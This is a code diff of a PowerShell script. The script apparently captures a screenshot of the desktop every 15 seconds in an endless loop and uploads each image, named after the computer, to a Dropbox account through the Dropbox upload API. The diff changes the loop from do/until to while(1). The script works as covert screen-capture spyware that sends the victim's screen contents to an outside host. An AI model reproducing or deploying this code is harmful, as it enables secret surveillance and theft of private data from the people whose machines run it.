@@ -1,9 +1,8 @@
-﻿do{
 function DropBox-Upload {
 
 [CmdletBinding()]
 param (
-	
+    
 [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
 [Alias("f")]
 [string]$SourceFilePath
@@ -20,7 +19,7 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-
+while(1){
 
   Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
@@ -43,4 +42,4 @@ Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Pos
   
   start-sleep -Seconds 15
  "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png" | DropBox-Upload
-}until($infinity)
+}
